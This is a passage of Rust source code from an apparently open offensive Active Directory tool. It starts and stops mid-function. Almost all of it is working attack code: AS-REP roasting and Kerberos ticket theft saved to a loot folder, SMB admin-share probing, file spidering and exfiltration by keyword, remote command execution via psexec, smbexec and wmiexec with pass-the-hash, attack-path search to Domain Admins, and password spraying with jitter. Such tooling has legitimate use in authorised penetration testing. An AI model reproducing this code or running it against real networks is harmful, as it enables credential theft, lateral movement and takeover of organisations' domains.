            }
        }
        KerberosAction::AsrepRoast { userlist } => {
            use overthrone_core::proto::kerberos;
            let loot_dir = std::path::PathBuf::from("./loot");
            let _ = std::fs::create_dir_all(&loot_dir);
            let output_path = loot_dir.join("asrep_hashes.txt");
            let userlist = userlist.as_deref().or(cli.user_list.as_deref());
            let dc = match require_dc(cli) {
                Ok(d) => d,
                Err(e) => return e,
            };

            let roast_users = |users: Vec<String>, domain: String| {
                let dc = dc.clone();
                let output_path = output_path.clone();
                async move {
                    if users.is_empty() {
                        banner::print_fail("No usernames provided for AS-REP roasting");
                        return 1;
                    }

                    let mut hash_count = 0;
                    for user in &users {
                        match kerberos::asrep_roast(&dc, &domain, user).await {
                            Ok(hash) => {
                                println!(
                                    "{} {}: {}",
                                    "✓".green(),
                                    user.cyan(),
                                    &hash.hash_string[..80.min(hash.hash_string.len())]
                                );
                                if let Ok(mut f) = std::fs::OpenOptions::new()
                                    .create(true)
                                    .append(true)
                                    .open(&output_path)
                                {
                                    use std::io::Write;
                                    let _ = writeln!(f, "{}", hash.hash_string);
                                }
                                hash_count += 1;
                            }
                            Err(e) => {
                                println!("{} {}: {}", "✗".dimmed(), user, e);
                            }
                        }
                    }

                    if hash_count > 0 {
                        banner::print_success(&format!(
                            "{} AS-REP hashes written to {}",
                            hash_count,
                            output_path.display()
                        ));
                        0
                    } else {
                        banner::print_fail("No AS-REP roastable accounts found");
                        1
                    }
                }
            };

            if let Some(path) = userlist {
                let domain = match cli.domain.as_deref() {
                    Some(domain) => domain.to_string(),
                    None => {
                        banner::print_fail("--domain is required for AS-REP roasting");
                        return 1;
                    }
                };

                let users: Vec<String> = match std::fs::read_to_string(path) {
                    Ok(content) => content
                        .lines()
                        .map(|line| line.trim().to_string())
                        .filter(|line| !line.is_empty())
                        .collect(),
                    Err(e) => {
                        banner::print_warn(&format!(
                            "Cannot read userlist {}: {}. Falling back to embedded list.",
                            path, e
                        ));
                        overthrone_hunter::userenum::embedded_usernames()
                    }
                };

                return roast_users(users, domain).await;
            }

            let domain = match cli.domain.as_deref() {
                Some(domain) => domain.to_string(),
                None => {
                    banner::print_fail("--domain is required for AS-REP roasting");
                    return 1;
                }
            };

            if let Some((username, secret, use_hash)) =
                cli.username.as_deref().and_then(|username| {
                    cli.nt_hash
                        .as_deref()
                        .map(|hash| (username.to_string(), hash.to_string(), true))
                        .or_else(|| {
                            cli.password
                                .as_deref()
                                .map(|password| (username.to_string(), password.to_string(), false))
                        })
                })
            {
                let hunt_config = overthrone_hunter::HuntConfig {
                    dc_ip: dc.clone(),
                    domain: domain.clone(),
                    username,
                    secret,
                    use_hash,
                    base_dn: None,
                    use_ldaps: false,
                    output_dir: loot_dir.clone(),
                    concurrency: 10,
                    timeout: 30,
                    jitter_ms: 0,
                    tgt: None,
                };
                let ac = overthrone_hunter::asreproast::AsRepRoastConfig {
                    output_file: Some(output_path.clone()),
                    ..Default::default()
                };

                match overthrone_hunter::asreproast::run(&hunt_config, &ac).await {
                    Ok(result) => {
                        if result.hashes.is_empty() {
                            banner::print_fail("No AS-REP roastable accounts found");
                            return 1;
                        }
                        for h in &result.hashes {
                            println!(
                                "{} {}: {}",
                                "✓".green(),
                                h.username.cyan(),
                                &h.hash_string[..80.min(h.hash_string.len())]
                            );
                        }
                        banner::print_success(&format!(
                            "{} AS-REP hashes written to {}",
                            result.hashes.len(),
                            output_path.display()
                        ));
                        return 0;
                    }
                    Err(e) => {
                        banner::print_fail(&format!("AS-REP roast failed: {}", e));
                        return 1;
                    }
                }
            }

            banner::print_warn(
                "No explicit LDAP bind credentials supplied; using embedded username fallback for AS-REP roasting.",
            );
            let users = overthrone_hunter::userenum::embedded_usernames();
            return roast_users(users, domain).await;
        }
        KerberosAction::GetTgs { spn } => {
            use overthrone_core::proto::kerberos;
            let creds = match require_creds(cli) {
                Ok(c) => c,
                Err(e) => return e,
            };
            let (secret, use_hash) = match creds.secret_and_hash_flag() {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&e);
                    return 1;
                }
            };
            // Get TGT first (with cache-first logic)
            let tgt = match crate::commands_impl::get_cached_tgt(
                &dc,
                &creds.domain,
                &creds.username,
                &secret,
                use_hash,
                false,
            )
            .await
            {
                Ok(t) => t,
                Err(e) => {
                    banner::print_fail(&format!("TGT request failed: {}", e));
                    return 1;
                }
            };
            // Request service ticket
            match kerberos::request_service_ticket(&dc, &tgt, &spn).await {
                Ok(st) => {
                    println!("{} Service ticket for {} obtained", "✓".green(), spn.cyan());
                    let loot_dir = std::path::PathBuf::from("./loot");
                    let _ = std::fs::create_dir_all(&loot_dir);
                    let safe_spn = spn.replace('/', "_");
                    let kirbi_path = loot_dir.join(format!("{}_tgs.kirbi", safe_spn));
                    if let Ok(mut f) = std::fs::File::create(&kirbi_path) {
                        use kerberos_asn1::Asn1Object;
                        use std::io::Write;
                        let _ = f.write_all(&st.ticket.build());
                        println!("{} Saved to {}", "→".cyan(), kirbi_path.display());
                    }
                    banner::print_success("TGS obtained");
                }
                Err(e) => {
                    banner::print_fail(&format!("TGS request failed: {}", e));
                    return 1;
                }
            }
        }
        KerberosAction::GetTgt => {
            use overthrone_core::cred_cache::CredCache;
            use overthrone_core::proto::kerberos;
            let creds = match require_creds(cli) {
                Ok(c) => c,
                Err(e) => return e,
            };
            let (secret, use_hash) = match creds.secret_and_hash_flag() {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&e);
                    return 1;
                }
            };

            match crate::commands_impl::get_cached_tgt(
                &dc,
                &creds.domain,
                &creds.username,
                &secret,
                use_hash,
                false,
            )
            .await
            {
                Ok(tgt) => {
                    println!(
                        "{} TGT {} for {}@{}",
                        "✓".green(),
                        "obtained".cyan(),
                        tgt.client_principal.cyan(),
                        tgt.client_realm.cyan()
                    );

                    let loot_dir = std::path::PathBuf::from("./loot");
                    let _ = std::fs::create_dir_all(&loot_dir);
                    let kirbi_path = loot_dir.join("tgt.kirbi");
                    let kirbi_bytes = kerberos::tgd_to_kirbi(&tgt);
                    if std::fs::write(&kirbi_path, &kirbi_bytes).is_ok() {
                        println!("{} Saved to {}", "→".cyan(), kirbi_path.display());
                    }

                    let cache = CredCache::new();
                    let _ = cache.save_tgt(&tgt);

                    banner::print_success("TGT obtained");
                    return 0;
                }
                Err(e) => {
                    banner::print_fail(&format!("TGT request failed: {}", e));
                    return 1;
                }
            }
        }
        KerberosAction::UserEnum { .. } => {
            // Handled above before credential check (zero-knowledge, no creds needed)
            eprintln!(
                "[!] Internal error: KerberosAction::UserEnum should have been handled before credential check"
            );
            return 1;
        }
    }
    0
}

// cmd_smb
async fn cmd_smb(cli: &Cli, action: SmbAction) -> i32 {
    banner::print_module_banner("SMB");
    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let (secret, use_hash) = match creds.secret_and_hash_flag() {
        Ok(s) => s,
        Err(e) => {
            banner::print_fail(&e);
            return 1;
        }
    };

    // Helper closure to connect
    let smb_connect = |target: &str| {
        let domain = creds.domain.clone();
        let username = creds.username.clone();
        let secret = secret.clone();
        let target = target.to_string();
        async move {
            if use_hash {
                overthrone_core::proto::smb::SmbSession::connect_with_hash(
                    &target, &domain, &username, &secret,
                )
                .await
            } else {
                overthrone_core::proto::smb::SmbSession::connect(
                    &target, &domain, &username, &secret,
                )
                .await
            }
        }
    };

    match action {
        SmbAction::Shares { target } => {
            let smb = match smb_connect(&target).await {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&format!("SMB connect to {}: {}", target, e));
                    return 1;
                }
            };
            let shares = smb
                .check_share_access(&["C$", "ADMIN$", "IPC$", "SYSVOL", "NETLOGON", "print$"])
                .await;
            println!(
                "\n  {:<15} {:<10} {}",
                "Share".bold(),
                "Read".bold(),
                "Write".bold()
            );
            println!("  {}", "─".repeat(40));
            for s in &shares {
                let read = if s.readable {
                    "✓".green().to_string()
                } else {
                    "✗".red().to_string()
                };
                let write = if s.writable {
                    "✓".green().to_string()
                } else {
                    "✗".red().to_string()
                };
                println!("  {:<15} {:<10} {}", s.share_name, read, write);
            }
            banner::print_success(&format!(
                "{} shares found, {} readable",
                shares.len(),
                shares.iter().filter(|s| s.readable).count()
            ));
        }
        SmbAction::Admin { targets } => {
            // targets is a comma-separated string
            let target_list: Vec<&str> = targets.split(',').map(|t| t.trim()).collect();
            for target in &target_list {
                let smb = match smb_connect(target).await {
                    Ok(s) => s,
                    Err(e) => {
                        println!("{} {}: {}", "✗".red(), target, e);
                        continue;
                    }
                };
                let result = smb.check_admin_access().await;
                if result.has_admin {
                    println!(
                        "{} {} — {}",
                        "✓".green(),
                        target.bold(),
                        "ADMIN".green().bold()
                    );
                } else {
                    println!("{} {} — {}", "✗".red(), target, "no admin".dimmed());
                }
            }
            banner::print_success("Admin check completed");
        }
        SmbAction::Spider {
            target,
            extensions,
            grep,
            regex,
            output_dir,
            max_depth,
        } => {
            let ext_list: Vec<String> = extensions
                .split(',')
                .map(|s| s.trim().to_lowercase())
                .filter(|s| !s.is_empty())
                .collect();

            let content_search = grep.is_some() || regex.is_some();
            let re = if let Some(ref p) = regex {
                match regex::RegexBuilder::new(p).case_insensitive(true).build() {
                    Ok(r) => Some(r),
                    Err(e) => {
                        banner::print_fail(&format!("Invalid regex pattern: {e}"));
                        return 1;
                    }
                }
            } else {
                None
            };

            let keyword = grep.as_ref().map(|k| k.to_lowercase());

            if let Some(ref dir) = output_dir
                && let Err(e) = std::fs::create_dir_all(dir)
            {
                banner::print_fail(&format!("Cannot create output dir {}: {}", dir, e));
                return 1;
            }

            let mut search_desc = ext_list.join(", ");
            if content_search {
                if let Some(ref k) = grep {
                    search_desc = format!("{} | grep: {}", search_desc, k);
                }
                if let Some(ref r) = regex {
                    search_desc = format!("{} | regex: {}", search_desc, r);
                }
            }

            println!(
                "{} Spidering shares on: {} (filtering: {})",
                "🕷".bright_black(),
                target.cyan(),
                search_desc.yellow()
            );

            let smb = match smb_connect(&target).await {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&format!("SMB connect: {}", e));
                    return 1;
                }
            };

            let candidate_shares = &[
                "C$", "ADMIN$", "Users", "Shares", "Public", "Data", "IT", "Backups", "Finance",
                "HR",
            ];
            let mut total_found = 0usize;
            let mut content_matches = 0usize;
            let mut downloaded = 0usize;

            for &share in candidate_shares {
                if !smb.check_share_read(share).await {
                    continue;
                }
                println!(
                    "  {} \\\\{}\\{}",
                    "▸".bright_black(),
                    target.cyan(),
                    share.yellow()
                );

                // BFS walk of the share with depth tracking
                let mut queue: Vec<(String, usize)> = vec![(String::new(), 0)];
                while let Some((dir, depth)) = queue.pop() {
                    if depth >= max_depth {
                        continue;
                    }
                    let entries = match smb.list_directory(share, &dir).await {
                        Ok(e) => e,
                        Err(_) => continue,
                    };
                    for entry in entries {
                        if entry.is_directory {
                            if queue.len() < 5000 {
                                queue.push((entry.path.clone(), depth + 1));
                            }
                        } else {
                            let name_lower = entry.name.to_lowercase();
                            let matched = ext_list.is_empty()
                                || ext_list
                                    .iter()
                                    .any(|ext| name_lower.ends_with(ext.as_str()));
                            if !matched {
                                continue;
                            }

                            let display_path = format!(
                                "\\\\{}\\{}\\{}",
                                target.cyan(),
                                share.yellow(),
                                entry.path
                            );

                            let mut print_line = format!(
                                "    {} {}  ({} bytes)",
                                "📄".bright_black(),
                                display_path,
                                entry.size
                            );

                            if content_search {
                                match smb.read_file(share, &entry.path).await {
                                    Ok(data) => {
                                        let content_lower =
                                            String::from_utf8_lossy(&data).to_lowercase();
                                        let mut content_hit = false;

                                        if let Some(ref kw) = keyword {
                                            content_hit = content_lower.contains(kw.as_str());
                                        }
                                        if !content_hit && let Some(ref r) = re {
                                            content_hit = r.is_match(&content_lower);
                                        }

                                        if content_hit {
                                            print_line.push_str(&format!(
                                                "  {}",
                                                "[MATCH]".green().bold()
                                            ));
                                            content_matches += 1;

                                            if let Some(ref dir) = output_dir {
                                                let safe_name =
                                                    entry.path.replace(['\\', '/', ':'], "_");
                                                let out_path =
                                                    std::path::Path::new(dir).join(&safe_name);
                                                if let Err(e) = std::fs::write(&out_path, &data) {
                                                    print_line.push_str(&format!(
                                                        "  {}",
                                                        format!("[dl error: {e}]").red()
                                                    ));
                                                } else {
                                                    downloaded += 1;
                                                }
                                            }
                                            println!("{}", print_line);
                                            total_found += 1;
                                        }
                                    }
                                    Err(e) => {
                                        print_line.push_str(&format!(
                                            "  {}",
                                            format!("[read error: {e}]").red()
                                        ));
                                        println!("{}", print_line);
                                    }
                                }
                            } else {
                                println!("{}", print_line);
                                total_found += 1;
                            }
                        }
                    }
                }
            }

            if total_found == 0 {
                banner::print_warn("No matching files found");
            } else {
                let mut summary = format!("Spider found {} matching file(s)", total_found);
                if content_matches > 0 {
                    summary.push_str(&format!(", {} content matches", content_matches));
                }
                if downloaded > 0 {
                    summary.push_str(&format!(
                        ", {} downloaded to {}",
                        downloaded,
                        output_dir.as_deref().unwrap_or(".").cyan()
                    ));
                }
                banner::print_success(&summary);
            }
        }
        SmbAction::Get { target, path } => {
            let smb = match smb_connect(&target).await {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&format!("SMB connect: {}", e));
                    return 1;
                }
            };
            // Parse share and path from the path string (e.g. "C$/Users/file.txt")
            let (share, remote_path) = match path.split_once('/') {
                Some((s, p)) => (s, p),
                None => ("C$", path.as_str()),
            };
            match smb.read_file(share, remote_path).await {
                Ok(data) => {
                    let filename = std::path::Path::new(remote_path)
                        .file_name()
                        .unwrap_or_default()
                        .to_string_lossy()
                        .to_string();
                    let local_path = format!("./{}", filename);
                    match std::fs::write(&local_path, &data) {
                        Ok(_) => {
                            banner::print_success(&format!(
                                "Downloaded {} bytes to {}",
                                data.len(),
                                local_path
                            ));
                        }
                        Err(e) => {
                            banner::print_fail(&format!("Failed to write local file: {}", e));
                            return 1;
                        }
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("Download failed: {}", e));
                    return 1;
                }
            }
        }
        SmbAction::Put {
            target,
            local,
            remote,
        } => {
            let smb = match smb_connect(&target).await {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&format!("SMB connect: {}", e));
                    return 1;
                }
            };
            let data = match std::fs::read(&local) {
                Ok(d) => d,
                Err(e) => {
                    banner::print_fail(&format!("Cannot read {}: {}", local, e));
                    return 1;
                }
            };
            let (share, remote_path) = match remote.split_once('/') {
                Some((s, p)) => (s, p),
                None => ("C$", remote.as_str()),
            };
            match smb.write_file(share, remote_path, &data).await {
                Ok(_) => {
                    banner::print_success(&format!(
                        "Uploaded {} bytes to \\\\{}\\{}\\{}",
                        data.len(),
                        target,
                        share,
                        remote_path
                    ));
                }
                Err(e) => {
                    banner::print_fail(&format!("Upload failed: {}", e));
                    return 1;
                }
            }
        }
    }
    0
}

// cmd_exec
async fn cmd_exec(cli: &Cli, method: ExecMethod, target: &str, command: &str) -> i32 {
    banner::print_module_banner("EXECUTION");
    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let (secret, use_hash) = match creds.secret_and_hash_flag() {
        Ok(s) => s,
        Err(e) => {
            banner::print_fail(&e);
            return 1;
        }
    };

    println!(
        "{} {} on {} via {:?}",
        "⚡".bright_black(),
        command.yellow(),
        target.cyan(),
        method
    );

    // Connect via SMB
    let smb = if use_hash {
        overthrone_core::proto::smb::SmbSession::connect_with_hash(
            target,
            &creds.domain,
            &creds.username,
            &secret,
        )
        .await
    } else {
        overthrone_core::proto::smb::SmbSession::connect(
            target,
            &creds.domain,
            &creds.username,
            &secret,
        )
        .await
    };

    let smb = match smb {
        Ok(s) => s,
        Err(e) => {
            banner::print_fail(&format!("SMB connect failed: {}", e));
            return 1;
        }
    };

    // Dispatch to the appropriate execution method — normalize to (success, output_string)
    use overthrone_core::exec::{psexec, smbexec, wmiexec};
    let exec_result: Result<(bool, String), overthrone_core::OverthroneError> = match method {
        ExecMethod::PsExec => {
            let cfg = psexec::PsExecConfig {
                command: command.to_string(),
                ..Default::default()
            };
            psexec::execute(&smb, &cfg)
                .await
                .map(|r| (r.success, r.output.unwrap_or_default()))
        }
        ExecMethod::SmbExec => smbexec::exec_command(&smb, command)
            .await
            .map(|r| (r.success, r.output)),
        ExecMethod::WmiExec => wmiexec::exec_command(&smb, command)
            .await
            .map(|r| (r.success, r.output)),
        ExecMethod::WinRm => {
            // WinRM falls back to smbexec for now
            smbexec::exec_command(&smb, command)
                .await
                .map(|r| (r.success, r.output))
        }
        ExecMethod::Auto => {
            // Try smbexec first (most reliable), fall back to psexec
            match smbexec::exec_command(&smb, command).await {
                Ok(r) => Ok((r.success, r.output)),
                Err(_) => {
                    let cfg = psexec::PsExecConfig {
                        command: command.to_string(),
                        ..Default::default()
                    };
                    psexec::execute(&smb, &cfg)
                        .await
                        .map(|r| (r.success, r.output.unwrap_or_default()))
                }
            }
        }
    };

    match exec_result {
        Ok((_, output)) => {
            if !output.is_empty() {
                println!("{}", output);
            }
            banner::print_success("Command executed");
            0
        }
        Err(e) => {
            banner::print_fail(&format!("Execution failed: {}", e));
            1
        }
    }
}

// cmd_graph
async fn cmd_graph(cli: &Cli, graph_file: Option<&str>, action: GraphAction) -> i32 {
    banner::print_module_banner("ATTACK GRAPH");

    let default_path = "attack_graph.json";

    match action {
        GraphAction::Build => {
            println!(
                "{}",
                "Building attack graph from LDAP enumeration...".bright_black()
            );

            // Require DC + creds for Build
            let domain = match require_dc_only_creds(cli) {
                Ok(d) => d,
                Err(e) => return e,
            };
            let dc = match require_dc(cli) {
                Ok(d) => d,
                Err(e) => return e,
            };
            let creds = match require_creds(cli) {
                Ok(c) => c,
                Err(e) => return e,
            };

            let password = creds.password().unwrap_or("");
            println!(
                "  {} Connecting to {} as {}\\{}...",
                "▸".bright_black(),
                dc.cyan(),
                domain.cyan(),
                creds.username.cyan()
            );

            let mut session = match overthrone_core::proto::ldap::LdapSession::connect(
                &dc,
                &domain,
                &creds.username,
                password,
                false,
            )
            .await
            {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&format!("LDAP connection failed: {}", e));
                    return 1;
                }
            };

            println!(
                "  {} Running full domain enumeration...",
                "▸".bright_black()
            );
            let enumeration = match session.full_enumeration().await {
                Ok(data) => data,
                Err(e) => {
                    banner::print_fail(&format!("Enumeration failed: {}", e));
                    let _ = session.disconnect().await;
                    return 1;
                }
            };
            let _ = session.disconnect().await;

            println!(
                "  {} Users: {}, Computers: {}, Groups: {}, Trusts: {}",
                "▸".bright_black(),
                enumeration.users.len().to_string().green(),
                enumeration.computers.len().to_string().green(),
                enumeration.groups.len().to_string().green(),
                enumeration.trusts.len().to_string().green(),
            );

            let mut graph = AttackGraph::new();
            graph.ingest_enumeration(&enumeration);

            let output_path = graph_file.unwrap_or(default_path);
            let json = match graph.export_json() {
                Ok(j) => j,
                Err(e) => {
                    banner::print_fail(&format!("Failed to export graph: {}", e));
                    return 1;
                }
            };
            if let Err(e) = std::fs::write(output_path, &json) {
                banner::print_fail(&format!("Failed to write {}: {}", output_path, e));
                return 1;
            }

            let stats = graph.stats();
            println!(
                "  {} Graph: {} nodes, {} edges",
                "▸".bright_black(),
                stats.total_nodes.to_string().green(),
                stats.total_edges.to_string().green(),
            );
            banner::print_success(&format!("Attack graph saved to {}", output_path));
        }

        GraphAction::View { input } => {
            let mut sources = input;
            if sources.is_empty() {
                let resolved_path = graph_file.unwrap_or(default_path);
                let path_obj = std::path::Path::new(resolved_path);

                if !path_obj.exists() {
                    banner::print_fail(&format!(
                        "Graph file not found: {}\n\nUsage:\n  overthrone graph view --input <FILE or DIR>\n  overthrone graph --file <FILE> view",
                        resolved_path
                    ));
                    return 1;
                }
                // If using default fallback, warn the user
                if graph_file.is_none() {
                    banner::print_info(&format!("Using default graph file: {}", resolved_path));
                }
                sources.push(resolved_path.to_string());
            }

            // Validate that all source files exist before launching the TUI
            for source in &sources {
                if !std::path::Path::new(source).exists() {
                    banner::print_fail(&format!("File not found: {}", source));
                    banner::print_info(
                        "Use --input or --file to specify a valid BloodHound JSON file.",
                    );
                    return 1;
                }
            }

            match tokio::task::spawn_blocking(move || bloodhound_viewer::run(&sources)).await {
                Ok(Ok(())) => {}
                Ok(Err(e)) => {
                    banner::print_fail(&format!("Graph visualizer failed: {}", e));
                    return 1;
                }
                Err(e) => {
                    banner::print_fail(&format!("Graph visualizer thread failed: {}", e));
                    return 1;
                }
            }
        }

        #[cfg(feature = "viewer")]
        GraphAction::Gui { input, port } => {
            // Build sources: prefer explicit input; otherwise prefer graph_file, then docs demo JSON, then fallback
            let sources = if input.is_empty() {
                let resolved_path = graph_file.unwrap_or_else(|| {
                    if std::path::Path::new("docs/bloodhound-hierarchy-demo.json").exists() {
                        "docs/bloodhound-hierarchy-demo.json"
                    } else {
                        default_path
                    }
                });
                if graph_file.is_none() {
                    banner::print_info(&format!("Using default graph file: {}", resolved_path));
                }
                vec![resolved_path.to_string()]
            } else {
                input
            };

            // Flexible existence checks: try the literal path, then try converting backslashes,
            // and finally attempt to canonicalize.
            let mut missing = false;
            for source in &sources {
                let mut found = false;
                let p = std::path::Path::new(source);
                if p.exists() {
                    found = true;
                } else if source.contains('\\') {
                    let alt = source.replace('\\', "/");
                    if std::path::Path::new(&alt).exists() {
                        found = true;
                    }
                }
                if !found && p.canonicalize().map(|c| c.exists()).unwrap_or(false) {
                    found = true;
                }

                if !found {
                    banner::print_fail(&format!("Graph source not found: {}", source));
                    missing = true;
                }
            }
            if missing {
                banner::print_info(
                    "Use --input or --file to specify valid JSON files or directories.",
                );
                return 1;
            }

            let viewer_cfg = overthrone_viewer::ViewerConfig {
                username: None,
                password: None,
                bind_address: Some(std::net::IpAddr::V4(std::net::Ipv4Addr::LOCALHOST)),
                ..Default::default()
            };
            if let Err(e) = overthrone_viewer::launch_with_config(&sources, port, viewer_cfg).await
            {
                banner::print_fail(&format!("Graph GUI failed: {}", e));
                return 1;
            }
        }

        GraphAction::Tree { input } => {
            let mut sources = input;
            if sources.is_empty() {
                let resolved_path = graph_file.unwrap_or(default_path);
                let path_obj = std::path::Path::new(resolved_path);

                if !path_obj.exists() {
                    banner::print_fail(&format!(
                        "Graph file not found: {}\n\nUsage:\n  overthrone graph tree --input <FILE or DIR>\n  overthrone graph --file <FILE> tree",
                        resolved_path
                    ));
                    return 1;
                }
                if graph_file.is_none() {
                    banner::print_info(&format!("Using default graph file: {}", resolved_path));
                }
                sources.push(resolved_path.to_string());
            }

            for source in &sources {
                if !std::path::Path::new(source).exists() {
                    banner::print_fail(&format!("File not found: {}", source));
                    banner::print_info(
                        "Use --input or --file to specify a valid BloodHound JSON file.",
                    );
                    return 1;
                }
            }

            match tokio::task::spawn_blocking(move || tree_viewer::run(&sources)).await {
                Ok(Ok(())) => {}
                Ok(Err(e)) => {
                    banner::print_fail(&format!("Tree visualizer failed: {}", e));
                    return 1;
                }
                Err(e) => {
                    banner::print_fail(&format!("Tree visualizer thread failed: {}", e));
                    return 1;
                }
            }
        }

        GraphAction::Path { from, to } => {
            let path = graph_file.unwrap_or(default_path);
            let graph = match AttackGraph::from_json_path(path) {
                Ok(g) => g,
                Err(e) => {
                    banner::print_fail(&format!("Failed to load graph from {}: {}", path, e));
                    banner::print_info("Run 'overthrone graph build' first, or use --file <path>");
                    return 1;
                }
            };

            println!(
                "  {} Finding path: {} → {}",
                "🗺".bright_black(),
                from.cyan(),
                to.cyan()
            );

            match graph.shortest_path(&from, &to) {
                Ok(attack_path) => {
                    println!();
                    println!("{}", attack_path);
                    banner::print_success(&format!(
                        "Path found: {} hops, cost {}",
                        attack_path.hop_count, attack_path.total_cost
                    ));
                }
                Err(e) => {
                    banner::print_fail(&format!("No path found: {}", e));
                    return 1;
                }
            }
        }

        GraphAction::PathToDa { from } => {
            let path = graph_file.unwrap_or(default_path);
            let graph = match AttackGraph::from_json_path(path) {
                Ok(g) => g,
                Err(e) => {
                    banner::print_fail(&format!("Failed to load graph from {}: {}", path, e));
                    banner::print_info("Run 'overthrone graph build' first, or use --file <path>");
                    return 1;
                }
            };

            // Extract domain from graph metadata, or guess from the 'from' node
            let domain = graph.metadata().get("domain").cloned().unwrap_or_else(|| {
                // Try to extract domain from "user@DOMAIN" format
                from.split('@').nth(1).unwrap_or("").to_string()
            });

            if domain.is_empty() {
                banner::print_fail(
                    "Cannot determine domain. Ensure graph has domain metadata or use USER@DOMAIN format.",
                );
                return 1;
            }

            println!(
                "  {} Finding paths to Domain Admins from {} in {}",
                "🗺".bright_black(),
                from.cyan(),
                domain.cyan()
            );

            let paths = graph.paths_to_da(&from, &domain);
            if paths.is_empty() {
                banner::print_fail("No paths to Domain Admins found");
                return 1;
            }

            println!();
            for (i, attack_path) in paths.iter().enumerate() {
                println!(
                    "  {} Path #{} (cost: {}, hops: {})",
                    "→".green(),
                    i + 1,
                    attack_path.total_cost,
                    attack_path.hop_count
                );
                println!("{}", attack_path);
            }
            banner::print_success(&format!("{} path(s) to Domain Admins found", paths.len()));
        }

        GraphAction::Stats => {
            let path = graph_file.unwrap_or(default_path);
            let graph = match AttackGraph::from_json_path(path) {
                Ok(g) => g,
                Err(e) => {
                    banner::print_fail(&format!("Failed to load graph from {}: {}", path, e));
                    banner::print_info("Run 'overthrone graph build' first, or use --file <path>");
                    return 1;
                }
            };

            let stats = graph.stats();
            println!();
            println!("  === Graph Statistics ===");
            println!("  Total nodes: {}", stats.total_nodes);
            println!("  Users: {}", stats.users);
            println!("  Computers: {}", stats.computers);
            println!("  Groups: {}", stats.groups);
            println!("  Domains: {}", stats.domains);
            println!("  GPOs: {}", stats.gpos);
            println!("  OUs: {}", stats.ous);
            println!("  Cert Templates: {}", stats.cert_templates);
            println!("  Total edges: {}", stats.total_edges);

            let hvt = graph.high_value_targets(10);
            if !hvt.is_empty() {
                println!();
                println!("  High-Value Targets:");
                for (name, node_type, degree) in &hvt {
                    println!("    {} ({:?}) - degree {}", name, node_type, degree);
                }
            }
            banner::print_success("Graph statistics displayed");
        }

        GraphAction::Export { output, bloodhound } => {
            let path = graph_file.unwrap_or(default_path);
            let graph = match AttackGraph::from_json_path(path) {
                Ok(g) => g,
                Err(e) => {
                    banner::print_fail(&format!("Failed to load graph from {}: {}", path, e));
                    banner::print_info("Run 'overthrone graph build' first, or use --file <path>");
                    return 1;
                }
            };

            let json = if bloodhound {
                println!(
                    "  {} Exporting in BloodHound-compatible format...",
                    "💾".bright_black()
                );
                graph.export_bloodhound()
            } else {
                println!(
                    "  {} Exporting in Overthrone JSON format...",
                    "💾".bright_black()
                );
                graph.export_json()
            };

            match json {
                Ok(data) => {
                    if let Err(e) = std::fs::write(&output, &data) {
                        banner::print_fail(&format!("Failed to write {}: {}", output, e));
                        return 1;
                    }
                    banner::print_success(&format!(
                        "Graph exported to {} ({} bytes)",
                        output,
                        data.len()
                    ));
                }
                Err(e) => {
                    banner::print_fail(&format!("Export failed: {}", e));
                    return 1;
                }
            }
        }
    }
    0
}

// cmd_spray
#[cfg(feature = "hunter")]
async fn cmd_spray(
    cli: &Cli,
    password: &str,
    userlist: Option<&str>,
    use_ldap: bool,
    delay: u64,
    jitter: u64,
    _concurrency: usize,
) -> i32 {
    banner::print_module_banner("PASSWORD SPRAY");

    let domain = match require_dc_only_creds(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };
    let dc = match require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };

    // Build username list: file -> LDAP -> embedded fallback
    let users: Vec<String> = if let Some(path) = userlist {
        match std::fs::read_to_string(path) {
            Ok(content) => content
                .lines()
                .map(|l| l.trim().to_string())
                .filter(|l| !l.is_empty())
                .collect(),
            Err(e) => {
                banner::print_fail(&format!("Cannot read userlist {}: {}", path, e));
                return 1;
            }
        }
    } else if use_ldap {
        // Try anonymous LDAP enumeration; fallback to embedded on failure
        match overthrone_core::proto::ldap::LdapSession::connect(&dc, &domain, "", "", false).await
        {
            Ok(mut conn) => match conn.enumerate_users().await {
                Ok(ad_users) => ad_users.into_iter().map(|u| u.sam_account_name).collect(),
                Err(e) => {
                    banner::print_warn(&format!(
                        "LDAP enumerate failed, using embedded list: {}",
                        e
                    ));
                    overthrone_hunter::userenum::embedded_usernames()
                }
            },
            Err(e) => {
                banner::print_warn(&format!("LDAP connect failed, using embedded list: {}", e));
                overthrone_hunter::userenum::embedded_usernames()
            }
        }
    } else {
        overthrone_hunter::userenum::embedded_usernames()
    };

    println!(
        "{} Spraying {} users against {} with password '{}'",
        "🔑".bright_black(),
        users.len(),
        domain.cyan(),
        password.yellow()
    );
    println!(
        "{} Delay: {}ms  Jitter: {}ms",
        "⏱".bright_black(),
        delay,
        jitter
    );

    let mut valid_creds = Vec::new();
    let mut locked_out = 0u32;
    use futures::stream;
    use overthrone_core::proto::kerberos;
    use std::time::Duration;

    // Create a stream of tasks that each wait `delay + jitter` then attempt auth.
    let attempt_stream = stream::iter(users.clone().into_iter().map(|user| {
        let dc = dc.clone();
        let domain = domain.clone();
        let password = password.to_string();
        async move {
            // per-attempt spacing
            if delay > 0 {
                tokio::time::sleep(Duration::from_millis(delay)).await;
            }
            if jitter > 0 {
                let jitter_add = rand::random::<u64>() % jitter;
                tokio::time::sleep(Duration::from_millis(jitter_add)).await;
            }
            let res = kerberos::request_tgt(&dc, &domain, &user, &password, false).await;
            (user, res)
        }
    }))
    .buffer_unordered(_concurrency.max(1));

    futures::pin_mut!(attempt_stream);
    while let Some((user, res)) = attempt_stream.next().await {
        match res {
            Ok(_tgt) => {
                println!(
                    "  {} {}:{} — {}",
                    "✓".green(),
                    user.as_str().bold(),
                    password,
                    "VALID".green().bold()
                );
                valid_creds.push(user.clone());
            }
            Err(e) => {
                let err_str = format!("{}", e);
